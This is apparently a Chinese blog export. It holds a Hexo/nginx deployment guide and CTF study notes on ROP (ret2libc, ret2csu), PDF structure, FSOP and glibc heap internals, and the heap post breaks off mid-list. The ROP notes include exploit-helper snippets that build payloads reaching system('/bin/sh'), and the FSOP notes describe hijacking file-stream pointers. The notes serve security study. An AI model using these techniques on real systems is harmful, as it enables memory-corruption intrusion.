<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init &lt;folder&gt;</span><br><span class="line">cd &lt;folder&gt;</span><br><span class="line">npm install</span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>然后运行一次hexo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure>

<p>然后在本地浏览器上，访问127.0.0.1:4000。如果hexo配置成功，则会出现hexo的默认页面。</p>
<p><img src="https://s2.loli.net/2021/12/25/MXljT2zv5BIY4wG.png" alt="default.png"></p>
<p>Ctrl+C结束后，继续进行配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd &lt;folder&gt;</span><br><span class="line">sudo _config.yml</span><br></pre></td></tr></table></figure>

<p>在配置文件中配置deploy用于一键部署，在文件最后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@&#x27;服务器ip&#x27;:&#x27;远程仓库路径&#x27;  # 远程仓库的创建在下文</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>

<h1 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h1><h2 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure>

<p>启动nginx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service nginx start</span><br></pre></td></tr></table></figure>

<p>登陆服务器访问服务器，出现nginx测试页面则代表成功</p>
<h2 id="创建git用户"><a href="#创建git用户" class="headerlink" title="创建git用户"></a>创建git用户</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adduser git</span><br></pre></td></tr></table></figure>

<h2 id="创建远程仓库"><a href="#创建远程仓库" class="headerlink" title="创建远程仓库"></a>创建远程仓库</h2> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir /var/repo</span><br><span class="line">cd /var/repo</span><br><span class="line">sudo mkdir blog.git</span><br><span class="line">sudo chown -R git:git blog.git</span><br><span class="line">cd blog.git</span><br><span class="line">git init --bare</span><br></pre></td></tr></table></figure>

<h2 id="创建静态文件夹"><a href="#创建静态文件夹" class="headerlink" title="创建静态文件夹"></a>创建静态文件夹</h2><p>用来存放本地hexo文件夹中的public文件夹文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir /var/www/blog</span><br><span class="line">sudo chown -R git:git /var/www/blog</span><br></pre></td></tr></table></figure>

<h2 id="配置静态服务器访问路径"><a href="#配置静态服务器访问路径" class="headerlink" title="配置静态服务器访问路径"></a>配置静态服务器访问路径</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>

<p>更改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">server &#123;</span><br><span class="line">        listen 80 default_server;</span><br><span class="line">        listen [::]:80 default_server;</span><br><span class="line"></span><br><span class="line">        # SSL configuration</span><br><span class="line">        #</span><br><span class="line">        # listen 443 ssl default_server;</span><br><span class="line">        # listen [::]:443 ssl default_server;</span><br><span class="line">        #</span><br><span class="line">        # Note: You should disable gzip for SSL traffic.</span><br><span class="line">        # See: https://bugs.debian.org/773332</span><br><span class="line">        #</span><br><span class="line">        # Read up on ssl_ciphers to ensure a secure configuration.</span><br><span class="line">        # See: https://bugs.debian.org/765782</span><br><span class="line">        #</span><br><span class="line">        # Self signed certs generated by the ssl-cert package</span><br><span class="line">        # Don&#x27;t use them in a production server!</span><br><span class="line">        #</span><br><span class="line">        # include snippets/snakeoil.conf;</span><br><span class="line"></span><br><span class="line">        root /var/www/blog;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>然后重启nginx即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service nginx restart</span><br></pre></td></tr></table></figure>

<h2 id="将本地机器上的ssh公钥填入authorized-keys文件"><a href="#将本地机器上的ssh公钥填入authorized-keys文件" class="headerlink" title="将本地机器上的ssh公钥填入authorized_keys文件"></a>将本地机器上的ssh公钥填入authorized_keys文件</h2><p>因为git是新用户，所以需要先生成自己的ssh公钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">su root</span><br></pre></td></tr></table></figure>

<p>一直回车即可，然后在本地机器上查看ssh公钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>

<p>复制后粘贴在服务器指定文件中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /home/git/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<h2 id="配置git-hook"><a href="#配置git-hook" class="headerlink" title="配置git hook"></a>配置git hook</h2><p>进入远程仓库进行操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd hooks</span><br><span class="line">sudo vim post-receive</span><br></pre></td></tr></table></figure>

<p>填入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">  </span><br><span class="line">git --work-tree=/var/www/blog --git-dir=/var/repo/blog.git checkout -f</span><br><span class="line">#               &lt;静态文件地址&gt;        &lt;远程仓库地址&gt;</span><br></pre></td></tr></table></figure>

<p>最后赋予文件可执行权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x post-receive</span><br></pre></td></tr></table></figure>

<p>然后就可实现自动部署</p>
<p>最后，在本地打开hexo文件夹进行操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>然后浏览器访问远程服务器，如果出现hexo默认页面则代表成功。至此，搭建博客结束。</p>
]]></content>
      <tags>
        <tag>hexo</tag>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>ROP介绍</title>
    <url>/2022/03/04/ROP%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p>简单介绍以下ROP攻击，主要以CTF WIki上的内容为骨架。</p>
<span id="more"></span>

<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>Return-oriented Programming(面向返回的编程)，也是我们常见的利用栈溢出漏洞的攻击方法。</p>
<h3 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h3><p>当我们能控制程序流程时，我们会使用一些程序中可以利用的指令片段(称之为gadget)，这些指令片段均已<code>ret</code> 结尾。通过这些gadget的执行和跳转达到我们想要的结果，最终get shell。</p>
<p>如何使用ROP，我也根据CTF Wiki来总结一下，但由于个人水平有限，仅记录一下基本和部分中级ROP。做题可以使用<a href="https://ropemporium.com/">ROP Emporium</a>上的题目，附上我以前写的<a href="http://110.42.161.158/2021/12/24/ROP-Emporium-64%E4%BD%8D/">ROP Emporium (64位)-writeup</a>。</p>
<h3 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h3><p>主要是一些攻击思维，操作根据实际搭配使用。</p>
<h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>程序保存在文件的文本段(.text)，而ret2text就是利用程序中已有的代码来进行攻击。如果我们知道敏感函数的地址，我们就可以利用栈溢出漏洞和gadget，来控制程序执行该函数。</p>
<h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h4><p>控制程序执行shellcode代码，<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。但是必须的是，我们写入shellcode的地址需要可执行权限。</p>
<h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>控制程序执行动态链接的libc中的函数，通常是利用栈溢出，改写return address为某个函数的plt表地址，或者函数的具体位置(存储在got表中)。并且由于常用来get shell的system函数一般不会用在程序中，所以利用其他函数泄露libc版本成为经常要做的操作。需要注意的是，动态链接具有<strong>延迟绑定机制</strong>，即需要函数执行过一次，got表中才会有该函数的地址。</p>
<p>这里我放上自己的ret2libc.sublime-snippet，方便做题使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;snippet&gt;</span><br><span class="line">	&lt;content&gt;&lt;![CDATA[</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2libc</span>(<span class="params">func,func_addr,module=<span class="number">1</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> module:</span><br><span class="line">        <span class="comment"># libc=ELF(libc_file)</span></span><br><span class="line">        libc=elf.libc</span><br><span class="line">        libc_base=func_addr-libc.sym[func]</span><br><span class="line">        sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">        environ=libc_base+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    	<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">    	libc=LibcSearcher(func,func_addr)</span><br><span class="line">    	libc_base=func_addr-libc.dump(func)</span><br><span class="line">        sys_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;libc_base&#x27;</span>:libc_base,<span class="string">&#x27;system&#x27;</span>:sys_addr,<span class="string">&#x27;binsh&#x27;</span>:binsh,<span class="string">&#x27;environ&#x27;</span>:environ&#125;</span><br><span class="line"></span><br><span class="line">libc=ret2libc($&#123;<span class="number">1</span>:func&#125;,$&#123;<span class="number">2</span>:func_addr&#125;)</span><br><span class="line">]]&gt;&lt;/content&gt;</span><br><span class="line">	&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a tabTrigger to define how to trigger the snippet --&gt;</span><br><span class="line">	&lt;tabTrigger&gt;ret2libc&lt;/tabTrigger&gt;</span><br><span class="line">	&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a scope to limit where the snippet will trigger --&gt;</span><br><span class="line">	&lt;!-- &lt;scope&gt;source.python&lt;/scope&gt; --&gt;</span><br><span class="line">&lt;/snippet&gt;</span><br></pre></td></tr></table></figure>

<p>其中使用了pwnlib.elf模块。默认使用了本地的libc文件，如果使用的是下载的libc文件就把注释取消了将libc_file替换为文件路径即可。</p>
<h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p>类似于ret2libc，不同是控制程序执行系统调用函数来get shell或泄露敏感文件内容，常需要构造rop chain或写入shellcode来使用。系统调用不了解可以看看这篇<a href="http://110.42.161.158/2022/03/04/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%BB%8B%E7%BB%8D/">文章</a>。</p>
<h3 id="中级ROP"><a href="#中级ROP" class="headerlink" title="中级ROP"></a>中级ROP</h3><h4 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h4><p>主要攻击方式以基本ROP为主，ret2csu的作用体现在对寄存器赋值上，个人觉得和高级ROP中的SROP功能差不多。原理是基于<code>__libc_csu_init</code> 中的 gadgets：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>这两段能完成对<code>rdx</code>,<code>rsi</code>,<code>edi</code>的赋值，其实主要是对<code>rdx</code>，一般有直接对寄存器<code>rsi</code>,<code>rdi</code>赋值的gadget，而对于<code>rdx</code>则无。</p>
<p>需要注意的是寄存器<code>r12</code>,<code>r13</code>的内容，由于在gadget中有指令<code>cmp rbx,rbp;jnz short loc_xxxxxx</code>与<code>call qword ptr [r12+rbx*8]</code>，意思是程序将对<code>rbx，rbp</code>的内容进行比较，不同则跳转会首部再执行一次；从<code>r12+rbx*8</code>地址保存的指令开始执行。一般我们将r13置为0，则会通过cmp检测。而r12的值可以当作一次rip来进行写入。或者可以使用<code>_fini</code>中的指令，这一块的指令对于我们的操作是无害的，内容为：<code>sub rsp,8;add rsp,8</code>，<code>_fini</code>的地址存放在<strong>dynamic</strong>部分。</p>
<p>这里我放上自己的ret2csu.sublime-snippet，方便做题使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;snippet&gt;</span><br><span class="line">	&lt;content&gt;&lt;![CDATA[</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2csu</span>(<span class="params">r12,r13,r14,r15,system=<span class="number">0</span></span>):</span></span><br><span class="line">    rbx=<span class="number">0</span></span><br><span class="line">    rbp=<span class="number">1</span></span><br><span class="line">    pop=$&#123;<span class="number">1</span>:pop&#125;</span><br><span class="line">    mov=$&#123;<span class="number">2</span>:mov&#125;</span><br><span class="line">    payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> system:</span><br><span class="line">        payload+=p32(pop)+p32(rbx)+p32(rbp)+p32(r12)+p32(r13)+p32(r14)+p32(r15)+p32(mov)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload+=p64(pop)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)+p64(mov)</span><br><span class="line">  	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload+=ret2csu($&#123;<span class="number">3</span>:system&#125;,$&#123;<span class="number">4</span>:rip&#125;,$&#123;<span class="number">5</span>:edi&#125;,$&#123;<span class="number">6</span>:rsi&#125;,$&#123;<span class="number">7</span>:rdx&#125;)</span><br><span class="line">]]&gt;&lt;/content&gt;</span><br><span class="line">	&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a tabTrigger to define how to trigger the snippet --&gt;</span><br><span class="line">	&lt;tabTrigger&gt;ret2csu&lt;/tabTrigger&gt;</span><br><span class="line">	&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a scope to limit where the snippet will trigger --&gt;</span><br><span class="line">	&lt;!-- &lt;scope&gt;source.python&lt;/scope&gt; --&gt;</span><br><span class="line">&lt;/snippet&gt;</span><br></pre></td></tr></table></figure>

<p>默认打包使用64位模式下的内存块大小，其中的pop指的是第二段gadget中的从<code>pop rbx</code>的地址，mov为第一段gadget的<code>mov rdx,r13</code>地址。</p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PDF文件结构</title>
    <url>/2022/04/26/PDF%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p>PDF具有比文本更多的功能; 它可以包含图像和其他多媒体元素，可以受密码保护，可以执行JavaScript等。<br>PDF文档由PDF文件正文部分中包含的对象组成。PDF文档中的大多数对象都是字典。文档的每个页面由页面对象表示，页面对象是包含对页面内容的引用的字典。页面对象连接在一起并形成一个页面树，在文档目录中使用间接引用声明。</p>
<span id="more"></span>

<p><img src="https://p2.ssl.qhimg.com/t0136824951bf7f4ba6.png" alt="PDF文件基本格式"></p>
<h2 id="标题-Header"><a href="#标题-Header" class="headerlink" title="标题/Header"></a>标题/Header</h2><p>PDF文件的第一行，指定了该文档当前使用的PDF规范的版本号。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000: 2550 4446 2d31 2e35 0a25 efc5 96c5 0a31  %PDF-1.5.%.....1</span><br></pre></td></tr></table></figure>

<p>在PDF文件中 % 是注释</p>
<h2 id="文件体-Body"><a href="#文件体-Body" class="headerlink" title="文件体/Body"></a>文件体/Body</h2><p>文件头中包含若干个对象</p>
<p><img src="https://s2.loli.net/2022/04/26/DLjptEfukQXyrlO.png" alt="文件体"></p>
<ul>
<li>第一个数字称为对象号，来唯一标识一个对象的</li>
<li>二个是产生号，是用来表明它在被创建后的第几次修改，所有新创建的PDF文件的产生号应该都是0，即第一次被创建以后没有被修改过</li>
<li>对象的内容应该是包含在&lt;&lt; 和&gt;&gt;之间的，以关键字 obj 开始 endobj 结束</li>
</ul>
<p>使用PdfStreamDumper打开该PDF</p>
<p><img src="https://s2.loli.net/2022/04/26/32XSwWtdP169Eq5.png" alt="example"></p>
<p>会发现其中有15个对象</p>
<p>第一个对象中的内容为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&lt;</span><br><span class="line">	/Pages 2 0 R</span><br><span class="line">	/Type /Catalog</span><br><span class="line">	/OpenAction 11 0 R</span><br><span class="line">	/AcroForm 13 0 R</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>与16进制文件中的对应</p>
<h2 id="xref-Cross-referance-table"><a href="#xref-Cross-referance-table" class="headerlink" title="xref/Cross-referance table"></a>xref/Cross-referance table</h2><p>交叉引用表，其中包含对文档中所有对象的引用。目的是允许随机访问文件的对象。</p>
<p><img src="https://s2.loli.net/2022/04/26/qWvuikQKlaePpcY.png" alt="xref"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xref</span><br><span class="line">0 15</span><br><span class="line">0000000000 65535 f</span><br><span class="line">0000000015 00000 n</span><br><span class="line">0000000137 00000 n</span><br><span class="line">0000000264 00000 n</span><br><span class="line">0000000294 00000 n</span><br><span class="line">0000000332 00000 n</span><br><span class="line">0000000481 00000 n</span><br><span class="line">0000000513 00000 n</span><br><span class="line">0000000733 00000 n</span><br><span class="line">0000000857 00000 n</span><br><span class="line">0000001026 00000 n</span><br><span class="line">0000041386 00000 n</span><br><span class="line">0000041467 00000 n</span><br><span class="line">0000045235 00000 n</span><br><span class="line">0000045274 00000 n</span><br></pre></td></tr></table></figure>

<p>以关键字 xref 开始，第一行数字内容代表该<strong>子部分</strong>中的对象是从0编号开始，共15个对象，之后所开启内容是子部分中对象的条目。因为提到了<strong>子部分</strong>，所以表明 xref 中可以有多个<strong>子部分</strong>，都是由数字开启的。</p>
<p>每个条目包含的内容有：起始位置、产生号(被修改过几次)、状态( f 表示空闲，n 表示正在使用)。特别的是，第一个对象的产生号为65535，表示不能修改，最后一个对象的产生号为0。</p>
<h2 id="尾部-Trailer"><a href="#尾部-Trailer" class="headerlink" title="尾部/Trailer"></a>尾部/Trailer</h2><p><img src="https://s2.loli.net/2022/04/26/xDBSQdIMN2rf6hZ.png" alt="尾部"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">trailer</span><br><span class="line">&lt;&lt;/Size 15/Root 1 0 R&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line">45699</span><br><span class="line">%%EOF</span><br></pre></td></tr></table></figure>

<p>该示例中只包含 size 和 root，其实不止。</p>
<ul>
<li>Size [integer]：指定交叉引用表中的条目数（也计算更新部分中的对象）。</li>
<li>Prev [integer]：指定从文件开头到上一个交叉引用部分的偏移量，如果有多个交叉引用部分，则使用该偏移量。</li>
<li>Root [字典]：指定文档目录对象的引用对象，它是一个特殊对象，包含指向不同类型的其他特殊对象的各种指针。</li>
<li>Encrypt [dictionary]：指定文档的加密字典。</li>
<li>Info [字典]：指定文档信息字典的引用对象。</li>
<li>ID [array]：指定形成文件标识符的两个字节未加密字符串的数组。</li>
<li>XrefStm [integer]：指定从解码流中的文件开头到交叉引用流的偏移量。这仅存在于混合引用文件中，如果我们还想要打开文档，即使应用程序不支持压缩引用流，也会指定它。</li>
</ul>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/kkle1994/article/details/81941029">【翻译】PDF格式详解</a></p>
<p><a href="https://blog.joe1sn.top/2020/10/06/%E5%88%9D%E5%AD%A6CVE-2010-2883%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E5%8F%8A%E5%A4%8D%E7%8E%B0/#PDF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F">初学CVE-2010-2883漏洞调试及复现_PDF文件格式</a></p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>PDF</tag>
      </tags>
  </entry>
  <entry>
    <title>FSOP</title>
    <url>/2022/05/27/FSOP/</url>
    <content><![CDATA[<p>劫持 _IO_list_all 并伪造链表</p>
<span id="more"></span>


<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>_IO_list_all 中保存着 IO_FILE 结构体的链表，因此我们将伪造的 fake_FILE 插入其中。</p>
<p>由于链表通过 _chain 来链接，而 _chain 相对 IO_FILE 的偏移为 0x68，所以最常见的插入链表操作为：</p>
<ul>
<li>伪造一个 fake_FILE 并放入 0x60 大小的 smallbin 中，这个位置正好相对于 main_arena+88(&amp;bin[0]) 的偏移为 0x68，所以我们使用 unsortedbin_attack 将 IO_list_all 覆盖为 main_arena+88 即可。</li>
<li>通过largebing_attack，将</li>
</ul>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>通过调用 _IO_flush_all_lockp，来刷新 _IO_list_all 链表中所有项的文件流，意味着会调用 vtable 中的 _IO_overflow。</p>
<p>调用 _IO_flush_all_lockp 的情况有：</p>
<ol>
<li>当 libc 执行 abort 流程时</li>
<li>当执行 exit 函数时</li>
<li>当执行流从 main 函数返回时</li>
</ol>
<p>而当系统检测 memory corruption 时，流程为:</p>
<ol>
<li>调用 abort()</li>
<li>调用 _IO_flush_all_lockp()</li>
<li>调用 JUMP_FIELD(_IO_overflow_t,__overflow)</li>
</ol>
<p><img src="https://ctf-wiki.org/pwn/linux/user-mode/io-file/figure/abort_routine.001.jpeg" alt="abort_routine"></p>
<p>如果我们将 system 作为伪造的 __overflow 指针，FILE 开头为 /bin/sh 就能获得 shell 了，或者直接使用 one_gadget。</p>
<p>因此我们需要伪造一个 fake_FILE，需要通过的检测为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
<p>因此需要伪造的内容有 _mode&lt;=0, _IO_write_ptr&gt;_IO_write_base, IO_overflow=something。</p>
<p>以上成员相对于 IO_FILE 首地址到偏移分别为 0xc0, 0x28, 0x20, *0xd8+24。</p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>FSOP</tag>
      </tags>
  </entry>
  <entry>
    <title>heap简介</title>
    <url>/2022/07/09/heap/</url>
    <content><![CDATA[<p>堆是一种数据结构，分配给每个程序的内存空间。与栈不同，堆内存动态分配获得，且堆内存是自低地址向高地址生长的。</p>
<span id="more"></span>

<h2 id="堆的分配与回收"><a href="#堆的分配与回收" class="headerlink" title="堆的分配与回收"></a>堆的分配与回收</h2><p>Linux 内存管理的基本思想为：延迟分配。即只有在真正访问一个地址时才建立这个地址的物理映射区，在这之前系统只为它分配了一个虚拟内存区。这与 glibc 的延迟绑定机制有点类似。</p>
<p>并且在调用 malloc 之前，heap 大小为0。首次调用 malloc 时，在分配前会首先获取一个较大的空间，即 top chunk，并且对于 main_arena 和 non_main_arena 来说，分配和增大 top chunk 的方式不同，在后面会提及。</p>
<p>glibc 的 malloc 族函数，主要对 sbrk 和 mmap 函数进行了封装。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  Returns a pointer to a newly allocated chunk of at least n</span></span><br><span class="line"><span class="comment">  bytes, or null if no space is available. Additionally, on </span></span><br><span class="line"><span class="comment">  failure, errno is set to ENOMEM on ANSI C systems.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  If n is zero, malloc returns a minimum-sized chunk. (The</span></span><br><span class="line"><span class="comment">  minimum size is 16 bytes on most 32bit systems, and 24 or 32</span></span><br><span class="line"><span class="comment">  bytes on 64bit systems.)  On most systems, size_t is an unsigned</span></span><br><span class="line"><span class="comment">  type, so calls with negative arguments are interpreted as</span></span><br><span class="line"><span class="comment">  requests for huge amounts of space, which will often fail. The</span></span><br><span class="line"><span class="comment">  maximum supported value of n differs across systems, but is in</span></span><br><span class="line"><span class="comment">  all cases less than the maximum representable value of a</span></span><br><span class="line"><span class="comment">  size_t.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  free(void* p)</span></span><br><span class="line"><span class="comment">  Releases the chunk of memory pointed to by p, that had been</span></span><br><span class="line"><span class="comment">  previously allocated using malloc or a related routine such as</span></span><br><span class="line"><span class="comment">  realloc. It has no effect if p is null. It can have arbitrary</span></span><br><span class="line"><span class="comment">  (i.e., bad!) effects if p has already been freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless disabled (using mallopt), freeing very large spaces will</span></span><br><span class="line"><span class="comment">  when possible, automatically trigger operations that give</span></span><br><span class="line"><span class="comment">  back unused memory to the system, thus reducing program</span></span><br><span class="line"><span class="comment">  footprint.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/brk%26mmap.png" alt="malloc"></p>
<h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3><p>对 heap 的操作，操作系统提供了 brk() 函数，C运行时库提供了 sbrk() 函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">brk</span><span class="params">(<span class="keyword">void</span> *addr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sbrk</span><span class="params">(<span class="keyword">intptr_t</span> increment)</span></span>;</span><br></pre></td></tr></table></figure>

<p>brk、sbrk 作用是用来改变数据段的大小。</p>
<p>具体的操作是增加 program break 的位置，program break 是用来定义进程数据段的结束，也是未初始化数据段的第一个位置。</p>
<p>brk 是设置 program break 的值为参数 addr。</p>
<p>sbrk 则是增加数据段的的长度，也就是增大 program break 的大小。</p>
<ul>
<li>返回 program break 改变后的地址，当 increment=0 时，返回原地址</li>
</ul>
<h3 id="mmap、munmap"><a href="#mmap、munmap" class="headerlink" title="mmap、munmap"></a>mmap、munmap</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags,<span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">munmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> length)</span></span>;</span><br></pre></td></tr></table></figure>

<p>mmap 会在进程的虚拟地址内创建一个新的映射空间，这块映射空间的其实位置由 addr 决定，length 决定映射空间的大小。munmap 会删除特定区域的映射。</p>
<p>而整个堆内存由 ptmalloc 进行管理。</p>
<h2 id="ptmalloc-内存管理概述"><a href="#ptmalloc-内存管理概述" class="headerlink" title="ptmalloc 内存管理概述"></a>ptmalloc 内存管理概述</h2><h3 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h3><h4 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h4><p>ptmalloc 给用户分配的空间会在前后加上一些控制信息，将这个整体称作chunk：</p>
<p><img src="https://s2.loli.net/2022/03/16/WhTe1Hxin3oE6SY.png" alt="chunk结构"></p>
<p>每个字段的具体的解释如下</p>
<ul>
<li><p>size of previous chunk(prev_size)</p>
